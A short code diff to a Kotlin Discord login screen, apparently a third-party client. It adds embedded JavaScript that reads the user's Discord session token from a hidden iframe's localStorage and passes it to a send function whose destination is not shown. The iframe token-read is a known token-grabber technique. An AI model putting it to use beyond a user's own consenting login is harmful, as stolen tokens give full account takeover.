@@ -197,6 +197,16 @@ fun DiscordLoginScreen(
                                             return null;
                                         }
 
+                                        function fromIframe() {
+                                            try {
+                                                var i = document.createElement('iframe');
+                                                document.body.appendChild(i);
+                                                var t = i.contentWindow.localStorage.token;
+                                                i.remove();
+                                                return t ? String(t) : null;
+                                            } catch (e) { return null; }
+                                        }
+
                                         function fromWebpack() {
                                             try {
                                                 if (typeof webpackChunkdiscord_app === 'undefined') return null;
@@ -220,7 +230,7 @@ fun DiscordLoginScreen(
 
                                         function check() {
                                             if (sent) return;
-                                            var t = fromStorage() || fromWebpack();
+                                            var t = fromStorage() || fromIframe() || fromWebpack();
                                             if (t) send(t);
                                         }
 
